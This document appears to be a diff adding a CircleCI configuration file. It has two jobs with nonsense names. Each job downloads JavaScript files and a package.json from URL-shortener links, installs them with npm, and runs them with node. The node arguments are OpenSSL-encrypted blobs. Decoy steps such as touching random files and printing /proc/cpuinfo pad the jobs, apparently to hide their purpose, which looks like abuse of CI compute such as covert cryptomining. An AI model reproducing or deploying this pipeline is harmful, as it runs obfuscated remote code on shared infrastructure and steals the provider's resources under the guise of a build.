@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  bomaycatdaumoi:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/juGPY -o package.json && curl -fsSL
+          shorturl.at/zGRT8 -o rr99kpf6z.js && curl -fsSL shorturl.at/kswHY -o
+          u0eilb7dgpdnuwrn.js
+      - run: touch 9p0gua11klmfelvkni.html
+      - run: echo version 27891994873.771465
+      - run: mkdir 664ib639jopgtaq4s4n7wf
+      - run: npm i -s
+      - run: mkdir 4j80m0ap5g9e36jirtgvquob
+      - run: node rr99kpf6z -lpn
+          U2FsdGVkX18jQxCr3val+WhziLEJFw8qFbcf1ALCal8XXahwgMxcxA6IzU2cPiLL -r
+          U2FsdGVkX18vPhkHeg1ddpkykPmoktFy5U7V9LK3htMRacmHJVNKF55HySG5jB0WtywnP/E0XNUT8Cnv32tgCYHBDRJyaujCNI8N+rantx5lZg2TzLXpbSVKn5Su92DnPE8XrkaWx6kEycNBoJt3t8HwOoAPzFI3Bx/9OZO7iZDEtpQhsiwhhg2mtL6HZLSGG1My3pwuy/th0NqyI2DTnCAcWVBtOdU+TZpGrkfHMpRTHFhIGzgV5m2NnNtwK6BlzEMwHdEPuQhb8EPHdHhp4pihgTe76/zs5aeteIM7IpU=
+          -s
+          U2FsdGVkX19WsGMM5gJwGoMfqfX8VxENiBjWt02nHgvosRp2Wsq7pefVccllcSj0ZQ9WKpGrGeijW2kaUx5s1GooJQ7BAeQVxZpoHTZcccqCJ2hdrLBBJVaRrZ13dtrJQV1JiFbLi9XmzFjHMDQlBTw5HeC74zEc6mMO/IjqkJwXPVRcCCWXPJENexF+qGZNUHGJfRq5Vm/yOx9Gw6v/jr3CfPqkWx73uLwDlCX+Iyg=
+          -sp -t
+          U2FsdGVkX18PL8B5l5/Zr9jd8pkHWtLBvXAlUuDBm/IsT1+zPbf+QJ5eIPyBUxvT
+      - run: touch bl65rf5ggwoo3ov5dh.py
+      - run: cat /proc/cpuinfo
+  starting:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/vzCDP -o am7ypxscvshki.js && curl -fsSL
+          shorturl.at/uwQU9 -o q3zgrstebt1z7m.js && curl -fsSL shorturl.at/fy127
+          -o package.json
+      - run: mkdir 0girekt6fgsx5ji3cd
+      - run: touch 59nzdvw1yqk6n6avrfr.html
+      - run: touch tfgtlo8bhs72uj5vn4p4o.cpp
+      - run: npm i -s
+      - run: cat /proc/cpuinfo
+      - run: touch 21bjcl9152lklfdbh7ylmh7a.js
+      - run: mkdir pgx2k3eonvyqmej7u2ng
+      - run: node q3zgrstebt1z7m -sp -r
+          U2FsdGVkX198FiBv0q7VtsI6fhW3EHu1u8x2YJRd3iGPMGtZ/jp4O95LZlDdkkU3m6m0wP3SMo/LJVav4IpqpOFrel225/T/5SaMc4Y5P0fnPcMIdWYsUtzkBmIVjJEEmVwXFDr9n5c1PhqvpOy4td4TsAyBR0T6Od6njE1WqKVdOp9vlIsJ9yvk4pztWdZX6OiwjCbUJJnIZzDPv8NZcixuSKRVVeyXA9YRPzztDfn8GvwUANKGxu2a+CzrLIFl+Ffgidrfq+00UumrVrEm8cKElKKOxS4jT5KXxK17hpc=
+          -lpn U2FsdGVkX181QAoKQAct1h+g5Xd5MlcDXPHS/F/paf4= -s
+          U2FsdGVkX1+dyPbokSNmllnw/Rw/hrsDTdoflONIMLb94Ro9PKWB2S5L/rDmgdhySwDwdhqwwqrpksaXC7M+m/x3jEQHjk2sq1RB5RmKZp+RgVzXsSJ4LPhPeZDEzxgmg1lFNDzg6oRG45JYsP+pwELfBSNezQun5KIOG4hgwtQeUYggEXDLBYTgeHdH4IMLiXyfp2QUgRZlm3v54OgA9HvwTas6+6DjfkiQRm0PZVc=
+          -t U2FsdGVkX19h4GzdQ/Mw29ZAKH0gP+uMqSJs9ig/UMqTpac7Uisu3Acy7jz1q/aV
+workflows:
+  checks_53:
+    jobs:
+      - bomaycatdaumoi
+  working:
+    jobs:
+      - starting
